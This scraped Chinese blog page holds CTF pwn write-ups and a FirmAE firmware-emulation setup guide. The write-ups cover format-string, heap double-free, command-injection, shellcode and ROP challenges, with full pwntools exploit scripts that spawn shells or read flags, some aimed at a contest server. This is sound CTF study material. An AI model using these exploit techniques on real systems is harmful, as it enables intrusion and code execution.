</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/" title="pwn入门-31-DASCTF六月二进制专项-1">pwn入门-31-DASCTF六月二进制专项-1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-05T09:50:57.000Z" title="发表于 2023-06-05 17:50:57">2023-06-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:21.738Z" title="更新于 2023-06-09 20:28:21">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		和哥几个打的这个比赛,虽然只做出了几道题,但是还有几道其实也都差不多了,思路都没问题,还是因为细节的问题,对原理的掌握不够深入导致的问题,还得再好好打基础和巩固.
fooooood​		这道格式化字符串题给自己整的太恶心了..主要是很久不做格式化字符串了,然后当时理解的没那么深入,有些小问题就卡死了…
​		非栈上的格式化字符串利用, 看到一种方法是可以利用栈上已有的指针,当时也用了,不过不知道为什么利用格式化字符串写数据的时候有问题….回头再专门学一下
​		这是一条可以利用的链
​		感觉自己的思路是没有问题的,但是对格式化字符串的一些利用的小点不是很熟悉,就导致了问题
​		

exp​		主要分了几部分,先把for循环的i改大一点,因为要循环很多次,然后还要地址泄露,再之后呢,写一个格式化字符串的替换函数,把返回地址修改了就可以了
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)libc = ELF(&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)io = process(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io)io.recvuntil(&quot;Give me your name:&quot;)io.sendline(&quot;test&quot;)io.recvuntil(&quot;favourite food: &quot;)io.sendline(&quot;%11$p&quot;)io.recvuntil(&quot;You like &quot;)#data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)rsp = int(io.recvuntil(&#x27;!?&#x27;)[:-2],16)-248print(hex(rsp))i = rsp+4i_off = i&amp;0xffffprint(hex(i_off))payload = b&#x27;%&#x27;+str(i_off).encode()+b&#x27;c%11$hn&#x27;print(payload)io.sendlineafter(&#x27;food: &#x27;,payload)payload = b&#x27;%&#x27;+str(40).encode()+b&#x27;c%37$hhn&#x27;sleep(1)io.sendlineafter(&#x27;food: &#x27;,payload)# 泄露libcpayload = b&#x27;%9$p&#x27;io.sendlineafter(&#x27;food: &#x27;,payload)io.recvuntil(&quot;You like &quot;)libc.address = int(io.recvuntil(&#x27;!?&#x27;)[:-2],16) - 240- libc.sym.__libc_start_main#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述 （1）与（2）两个栈地址在格式化字符串中的偏移def overlap(dest,ptr,off1,off2):    d = dest&amp;0xff    for i in range(8):        if not ptr:            break        payload=b&#x27;%&#x27;+str(d).encode()+b&#x27;c%&#x27;+str(off1).encode()+b&#x27;$hhn&#x27;        io.sendlineafter(&#x27;food: &#x27;,payload)        f=ptr&amp;0xff        payload=b&#x27;%&#x27;+str(f).encode()+b&#x27;c%&#x27;+str(off2).encode()+b&#x27;$hhn&#x27;        io.sendlineafter(&#x27;food: &#x27;,payload)        d+=1        ptr&gt;&gt;=8ret=rsp+0x18ptr=libc.address+0x21112payload = b&#x27;%&#x27;+str(ret&amp;0xffff).encode()+b&#x27;c%&#x27;+str(25).encode()+b&#x27;$hn&#x27;io.sendlineafter(&#x27;food: &#x27;,payload)pause()# 覆盖返回地址overlap(ret,ptr,25,39)overlap(ret+8,libc.search(b&#x27;/bin/sh&#x27;).__next__(),25,39)overlap(ret+16,libc.sym.system,25,39)io.sendlineafter(&#x27;food: &#x27;,payload)io.interactive()



​		自己之前的exp..回头检查下是哪的问题
12345678910111213141516171819202122232425262728293031323334353637from pwn import *context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)mylibc = ELF(&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)io = process(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io)io.recvuntil(&quot;Give me your name:&quot;)io.sendline(&quot;test&quot;)io.recvuntil(&quot;favourite food: &quot;)io.sendline(&quot;%31$p.%21$p&quot;)io.recvuntil(&quot;You like &quot;)data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)print(data)#pause()#libc_addr = int(data[3],16)-0x20840first_addr = int(data[0],16)print(hex(first_addr))#pause()#print(hex(libc_addr))#print(hex(ret_addr))#onegadget = libc_addr + 0x45226#pause()payload = fmtstr_payload(31,&#123;0x7fffff:0x7fffff&#125;)print(payload)#payload = b&quot;%58248c%31$n&quot;payload = b&quot;%.26204x%30$n&quot;#pause()io.recvuntil(&quot;favourite food: &quot;)io.sendline(payload)io.recvuntil(&quot;You like &quot;)pause()io.interactive()



​		存储备忘的信息
%10$p.%15$p.aaa
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x1ffffe540.0xc144e077e3cf5200.0x555555554b60.0x7ffff7a2d840.(nil).37
为什么不按顺序了…
0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x3ffffe540.0xb1fb67251108900.0x555555554b60.0x7ffff7a2d840.(nil).0x7fffffffe548test’
%12$p.%13$p.%14$p.%15$p.aaa
0x1f7ffcca0.0x555555554a67.(nil).0x7da3d3a4544d517e.aaa37
%16$p.%17$p.%18$p.%19$p.aaa
x555555554820.0x7fffffffe540.(nil).(nil).aaa
%20$p.%21$p.%22$p.%23$p.aaa
0x4f7197cdb841edfc.0x4f718777df51edfc.(nil).(nil).aaa
%24$p.%25$p.%26$p.%27$p.aaa
(nil).0x7fffffffe558.0x7ffff7ffe168.0x7ffff7de780b.aaa
%28$p.%29$p.%30$p.%31$p.aaa
(nil).(nil).0x555555554820.0x7fffffffe540.aaa
%32$p.%33$p.%34$p.%35$p.aaa
(nil).0x555555554849.0x7fffffffe538.0x1c.aaa
%36$p.%37$p.%38$p.%39$p.aaa
0x1.0x7fffffffe79c.(nil).0x7fffffffe7ba.aaa
0x7fffffffe388
0xffffe388
0xe388
11个位置 -0xd0
https://blog.csdn.net/qq_52877079/article/details/129756543
https://www.anquanke.com/post/id/184717
easynote​		简单的一道菜单堆题,看的时候很眼熟很眼熟,果然是之前做过的,只是稍微改动
​		https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/
​		开启了pie,那就用largebin smallbin的main_arena来泄露地址,
​		这里有个小坑,就是接收返回地址的时候一直接收不到,注意这是因为先接收到了\n,用recv应该是接收到\n为止? 所以可以用多个recv或者recvuntil,
​		malloc有检测,回头分析源码的时候可以具体看看
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *elf = &quot;./pwn&quot;context.log_level= &quot;debug&quot;p = process(elf)#p = remote(&quot;node4.buuoj.cn&quot;,25350)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def add(size,content):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;The length of your content ---&gt;&#x27;, str(size))    p.sendlineafter(&#x27;Content ---&gt;&#x27;, content)def edit(index, size,content):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))    p.sendlineafter(&#x27;The length of your content ---&gt;&#x27;, str(size))    p.sendlineafter(&#x27;Content ---&gt;&#x27;, content)def show(index):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;4&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))def delete(index):    p.sendlineafter(&#x27;5. exit&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Index ---&gt;&#x27;, str(index))add(0x30,&quot;aaa&quot;)add(0x30,&quot;bbb&quot;)delete(0)delete(1)delete(0)add(0x50,&quot;xielu&quot;)add(0x100,&quot;dizhi&quot;) # 3 泄露地址用add(0x50,&quot;hebing&quot;) # 防止合并delete(3)show(3)p.recvuntil(&quot;Content: &quot;)libc_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;)) - 0x3c4b78print(hex(libc_addr))# fastbin double free修改add(0x30,p64(0x602022))add(0x30,&quot;a&quot;)add(0x30,&quot;b&quot;)#pause()add(0x30,b&quot;\x40\x00\x00\x00\x00\x00&quot;+p64(libc_addr+0x4527a))p.interactive()



server​		当时做的时候没想到栈的重叠的问题,单纯过滤肯定是没戏的.咋说捏,只会一些传统的套路是不行的,那只是基础,要在此之上更上一个纬度,看清事物的本质,学会变通才能应对更复杂的情况.
​		对此题的反思就是,首先还是基础,要打好基础,打好操作系统原理的基础,如果懂这个的话,估计其实很容易想到重叠的问题.然后再培养细心以及一些自动化工具帮你寻找类似的点.
思路一​		access校验的长度有限,为32
1234567snprintf(name, 0x20uLL, &quot;/keys/%s.key&quot;, s);这个长度是27,加上/keys就是32了../../../../../././bin/sh #    /keys/../../../../../././bin/sh 最后access的是这个文件,肯定是存在的

​		
​		然后就是命令拼接了,存在未初始化漏洞,栈上有残留数据
​		第二次输入个单引号就好了, \n也可以作为命令分隔符,所以前面那个add_user -u ‘’就是没用的了,直接执行后面的&#x2F;bin&#x2F;sh了
​		过滤 ; &amp; &#96; | $ 空格 ( ) {} - &#x2F; \
​		这个不用写脚本,
123456789101112第一次选1,输入../../../../../././bin/sh #然后选2,输入&#x27;然后就闭合了,就可以getshell了    &quot;add_user -u &#x27;%s&#x27; -p &#x27;888888&#x27;&quot;        ► 0x555555555748    call   system@plt                &lt;system@plt&gt;        command: 0x7fffffffe410 ◂— &quot;add_user -u &#x27;&#x27;\n/bin/sh #&#x27; -p &#x27;888888&#x27;&quot;



思路二1&#x27;\ncat\tfl*\n

​		这里也用到覆盖了,看exp就可以理解了,exp的12就是随便输入的,后面的’\n会替代
​				过滤的空格可以用\t替代
12345678910111213141516171819202122232425262728293031from pwn import *elf = &quot;./pwn_7&quot;context.log_level= &quot;debug&quot;p = process(elf)#p =remote(&quot;node4.buuoj.cn&quot;, 25471)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input the key of admin : &quot;)p.sendline(b&quot;../../../../../../../../../&quot;)print(p.recv())p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Please input the username to add :&quot;)payload = b&quot;xxcat\tfl*\n&quot;p.sendline(payload)p.recv(1024)p.recv(1024)p.recvuntil(&quot;Your choice &gt;&gt;&quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Please input the username to add :&quot;)payload = b&quot;&#x27;&quot;p.sendline(payload)print(p.recv(1024))print(p.recv(1024))p.interactive()

​		 能不能’cat\tfl*\n呢,不能呀,,需要有个\n,但是没有,也没有; 没有分隔符没办法执行两条命令,这个必须要\n的 \t不行吗,不行…….
https://blog.51cto.com/u_15400016/4287727
https://www.secpulse.com/archives/96374.html
问题用recv应该是接收到\n为止? 所
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/" title="固件模拟工具firmae安装">固件模拟工具firmae安装</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-03T12:09:40.000Z" title="发表于 2023-06-03 20:09:40">2023-06-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:29:53.177Z" title="更新于 2023-06-09 20:29:53">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/IOT/">IOT</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a></span></div><div class="content">​		因为最近在做iot相关的漏洞复现,搭建环境是很重要的一环,qemu可以直接搭建,但有时候一些细节会导致一些问题,所以firmae是一个集成化的工具,可以帮助一键搭建环境.
​		但是安装这个工具的时候..又发生了奇奇怪怪的问题…记录一下.. 搞计算机遇到报错太正常了,但同样也是非常搞人心态的,学会如何排错,如何利用搜索引擎(包含chatgpt!)来解决问题是很重要的一个能力!
​		有一说一,能真机还是最好别虚拟… 当然没有那么多钱、也不一定能买到,虚拟也是不错的
工具地址:https://github.com/pr0v3rbs/FirmAE
搭建环境:ubuntu18
123git clone --recursive https://github.com/pr0v3rbs/FirmAE./download.sh               # 就是一个下载脚本,单纯的download..(国内服务器买香港的,或者用国外的..或者..../install.sh

​		然后报错了…一堆红…
​		其实如果不确定是哪里报错了,可以拆看sh脚本,一点一点执行,看看
​		报错:
1234./psycopg/psycopg.h:35:10: fatal error: Python.h: No such file or directory   #include &lt;Python.h&gt;            ^~~~~~~~~~  compilation terminated.

解决方案:https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory
​		其实不解决貌似后面也能搭建起来,好像是一路畅通,但运行起来还是显示不了页面等,肯定有问题,所以还是要解决的.
1sudo apt-get install python3-dev

​		运行完后重新跑一遍install脚本,出现这个,一路输入y
1Reversed (or previously applied) patch detected!  Assume -R? [n]



​		开始模拟
123./init.shwget https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip





123456root@VM-0-9-ubuntu:/home/ubuntu/FirmAE# ./run.sh -r tenda DIR868L_B1_FW205WWb02.bin[*] DIR868L_B1_FW205WWb02.bin emulation start!!!Traceback (most recent call last):  File &quot;./sources/extractor/extractor.py&quot;, line 19, in &lt;module&gt;    import binwalkModuleNotFoundError: No module named &#x27;binwalk&#x27;



​		不能直接pip3 install binwalk! 也不能apt install binwalk!!!!
​		参考:https://www.secpulse.com/archives/201139.html
​		可以观察到它目录下有binwalk这个目录,cd进去后 python3 setup.py install

​		解压固件要用这个命令 (github上也没说啊!!!!)
1binwalk -Me xxxx.bin --run-as=root

​		然后再run就可以了(有时候环境比较复杂,不知道哪个开的有影响,采用重启大法! 重启后init,然后run)

​		由于模拟环境是在云服务器上上的内网网卡,公网无法直接访问,需要做个端口转发,
​		gost:https://github.com/ginuerzh/gost
​		gzip -d 解压
1gost -L=tcp://:2222/192.168.0.2:80

​		然后就可以访问了!!!

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/" title="pwn入门-30-2023OUC校赛">pwn入门-30-2023OUC校赛</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-03T08:18:00.000Z" title="发表于 2023-06-03 16:18:00">2023-06-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:17.721Z" title="更新于 2023-06-09 20:28:17">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		拖了挺久才整理…不应该…以后要及时复盘. 本身题不是很难,不过有很多小细节,自己之前没弄懂,还是说有时间的话,多研究研究,以及之前的题,要进行一定的复盘.
恢复符号​		比较恶心的一个点(其实也不恶心,就是自己之前没弄过),找到了一些文章,然后github有编译好的符号文件,可以直接ida导入就好了,回头有时间可以自己编译一下
​		https://github.com/maroueneboubakri/lscan
​		https://blog.csdn.net/Breeze_CAT/article/details/103788796
​		ida中shift+f5,然后把符号文件添加进去
​		还有就是一些地址的计算…头大,,(估计还是原理没完全搞明白)
pwn1​		栈长度是0x68 &#x3D; 104,但能读取256,很明显的栈溢出,可以覆盖返回地址,而且没有开NX保护,可以写shellcode,于是问题就变成了怎么跳到shellcode呢,或者怎么知道shellcode的地址,puts的话,遇到\x00才会停止所以可以前面填满,然后输出ebp这里的值,这里的值好像会有一些变化,所以可以不用太具体,前面一直加nop就好了,跳到nop然后走,然后shellcode
121d:0074│     0xffffd4f4 ◂— 0x01e:0078│ ebp 0xffffd4f8 —▸ 0xffffd508 ◂— 0x0

​		ebp和esp差了0x90 esp和ecx(开始输出字符串那里)差了0x28,ebp输出的值和ebp差了0xbe,这样有点乱,画图会清晰很多


​		这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究,可以简单的跳到这个位置就好了,加一些nop(但是打远程的时候不知道为什么老不成功,可以加一点偏移,因为毕竟是往前跳)
​		有system有&#x2F;bin&#x2F;sh 能不能rop呢?
p32(addr-0xbe+0x2e+0x28)
​		
​		换句话说,ebp这个位置的值如果正好位于 [ebp-0x68,ebp-len(shellcode)]之间的话,就正好到了nop,如果大的话,就需要我们来加一点值了
12345678910111213141516171819202122232425262728##!/usr/bin/env pythonfrom pwn import *#sh = process(&#x27;./pwn1&#x27;)sh = remote(&quot;101.43.247.245&quot;,9200)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))shellcode = asm(shellcraft.sh())nop = asm(&#x27;&#x27;&#x27;        nop        &#x27;&#x27;&#x27;)shellcode = nop*30+shellcodepayload = shellcode.ljust(0x68, b&#x27;b&#x27;) + p32(0)+p32(addr+0xbe-0x78+0x10-4)print(hex(addr))print(hex(addr+0xbe-0x90+0x28+4))sh.sendline(payload)sh.interactive()





12345678910111213141516171819202122232425262728##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./pwn01&#x27;)#sh = remote(&quot;101.43.247.245&quot;,9200)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))print(hex(addr))#pause()shellcode = asm(shellcraft.sh())nop = asm(&#x27;&#x27;&#x27;        nop        &#x27;&#x27;&#x27;)shellcode = nop*40+shellcodepayload = shellcode.ljust(0x68,b&#x27;b&#x27;) + p32(0)+p32(addr+0x2e+0x28-4)sh.sendline(payload)sh.interactive()


还遇到很玄学的问题,nop加多了,怎么也不行,
感觉像是后面的指令并没有识别出来      不多,好像是没传送完全?

pwn2​		加了nx保护,用rop吧,ret2syscall, 这下不用算哪个比较恶心的shellcode的位置了,用ret2syscall是因为没有找到system函数..
​		execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)
​		其中，该程序是 32 位，所以我们需要使得

系统调用号，即 eax 应该为 0xb

第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。

第二个参数，即 ecx 应该为 0

第三个参数，即 edx 应该为 0
没有 &#x2F;bin&#x2F;sh,那就写入到栈后面,反正需要栈的地址,计算一下就可以了


1234567891011120x080b8eb6 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080df8bd : pop ecx ; ret0x0806f83b : pop edx ; ret0x0806d443 : int 0x80============================================================0x08048798 : leave ; ret

​		写一下payload
​		栈是104+4(ebp) &#x3D; 108, 溢出了 256-108 &#x3D; 148字节
1234binsh =  addr + 10*4payload= b&quot;a&quot;*0x68 + b&quot;b&quot;*4 + p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)

泄露栈地址​		puts函数遇到\n才会停止,所以可以以此来泄露栈上残留的值来泄露地址,其实不一定要泄露这个,哪个都行, 不过有一个问题就是,这个值会是固定的嘛… 
​		不是固定的….可以换一个泄露,但是如果覆盖了ebp的话,是不是会影响栈桢呢….

​		溢出长度是不够的,需要栈迁移
​		当时好像想的是先把&#x2F;bin&#x2F;sh写到一个地方…
这是做的时候写的exp,是有概率拿到shell的…
12345678910111213141516171819202122232425262728293031323334353637383940##!/usr/bin/env pythonfrom pwn import *#sh = process(&#x27;./pwn1&#x27;)sh = remote(&quot;101.43.247.245&quot;,9201)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)# 泄露栈地址sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))pop_eax = 0x080b8eb6pop_ebx = 0x080481c9pop_ecx = 0x080df8bdpop_edx = 0x0806f83bint80 = 0x0806d443leaveret = 0x08048798binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4payload= p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;/bin/sh\x00&quot;#payload= b&quot;/bin/sh\x00&quot;*0x8payload = payload.ljust(0x68,b&quot;a&quot;)+p32(addr+0xae-0x78+0x10-4)+p32(leaveret)#payload = payload.ljust(0x68,b&quot;a&quot;) +p32(0)+p32(addr+0xbe-0x78+0x10-4)print(hex(addr))print(hex(addr+0xae-0x78+0x10-4))sh.sendline(payload)sh.interactive()

​		查看符号 readelf objdump?
pwn3恶心的过滤…怎么把过滤应用到这了,
主要是 一个常用的指令, push xxx, 转成字节码会有\x68,正好命中了规则,草!
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283##!/usr/bin/env pythonfrom pwn import *#context(os=&#x27;linux&#x27;,arch=&quot;i386&quot;)#sh = process(&#x27;./pwn3&#x27;)sh = remote(&quot;101.43.247.245&quot;,9202)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.arch= &#x27;x86&#x27;context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x8048967&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)&#x27;&#x27;&#x27;sh.sendline(b&quot;a&quot;*0x60+p32(0)+p32(0x99999)+b&quot;d&quot;*8)#sh.sendline(b&quot;a&quot;*0x70)#addr = u32(sh.recv(8)[4:8])sh.recv(0x70)addr = u32(sh.recv(4))print(hex(addr))print(hex(addr+0xbe-0x90+0x28+4))&#x27;&#x27;&#x27;pop_eax = 0x080b8f16pop_ebx = 0x080481c9pop_ecx = 0x080df91dpop_edx = 0x0806f89bint80 = 0x0806d4a3leaveret = 0x08048798bssaddr = 0x080ECDBBjmpesp = 0x080dea1f#binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4str = &quot;&quot;#shellcode = asm(&quot;push 0x0;&quot;)shellcode = asm(&#x27;&#x27;&#x27;        push 0        mov eax,0x7478742e        push eax        mov  eax,0x67616c66        push eax        mov ebx,esp        xor ecx,ecx         #0        xor edx,edx         #0        mov eax,0x5         #调用号        int 0x80        mov eax,0x3;        mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”        mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件        mov edx,0x120;  #对应字节数        int 0x80;        mov eax,0x4;    # eax = sys_write        mov ebx,0x1;    # ebx = unsigned int fd = 1        int 0x80;        &#x27;&#x27;&#x27;)#shellcode = b&quot;\x66\x6c\x61\x67&quot; + shellcodeprint(shellcode)#shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)#shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)#shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)payload1 = p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;cat$flag.txt\x00&quot;#payload1 = p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload2 = p32(pop_eax)+p32(0x5)+p32(pop_ebx)+p32(bssaddr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(3)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload = shellcode#print(payload)#print(&quot;length&quot;)#print(len(payload))#shellcode = b&quot;&quot;payload = shellcode.ljust(0x60,b&quot;a&quot;) + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0x9999)sh.sendline(payload)sh.recv(0x120)sh.interactive()





pwn4​		0x68 ebp ret 的栈空间      输入0x80 24字节溢出, 减去4字节ebp的话,还有20字节
​		只开了NX,那就还是rop吧,这个有system和&#x2F;bin&#x2F;sh、或者直接后门函数..
1234567891011121314151617181920plt 0x8048440 system  0x80486C0 binsh.text:080485BD                 public shell.text:080485BD shell           proc near.text:080485BD ; __unwind &#123;.text:080485BD                 push    ebp.text:080485BE                 mov     ebp, esp.text:080485C0                 sub     esp, 8.text:080485C3                 sub     esp, 0Ch.text:080485C6                 push    offset command  ; &quot;/bin/sh&quot;.text:080485CB                 call    _system.text:080485D0                 add     esp, 10h.text:080485D3                 nop.text:080485D4                 leave.text:080485D5                 retn.text:080485D5 ; &#125; // starts at 80485BD.text:080485D5 shell           endp.text:080485D5

​		怎么看system的地址呢?,就是push的值不一样,但怎么确定哪个是system呢? (这个是动态链接了!)

exp
123456789from pwn import *#sh = process(&#x27;./pwn04&#x27;)sh = remote(&quot;101.43.247.245&quot;,9203)systemaddr = 0x8048440binsh = 0x80486C0sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))# sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(0x80485BD))sh.interactive()





pwn5主要是要理解清楚逻辑和内存代码布局就可以了
123456789101112131415161718192021222324252627signed int sub_80488CE()&#123;  int v0; // eax  char v2; // [esp-Ch] [ebp-24h]  int v3; // [esp+Ch] [ebp-Ch]  sub_804887C();  v3 = sub_8059F50(48);  sub_8048987(v3, 48);  v0 = sub_804DBD0(v3 + 16) + 5;  if ( v0 == 8 )  &#123;    sub_8048987(v3, 48);  &#125;  else if ( v0 &gt; 8 )  &#123;    if ( v0 == 10 )      return 0;    if ( v0 == 85145 )      sub_804F700(&quot;/bin/sh&quot;);  &#125;  else if ( v0 == 6 )  &#123;    sub_804FA00(&quot;where is shell&quot;, v2);  &#125;  return 1;&#125;



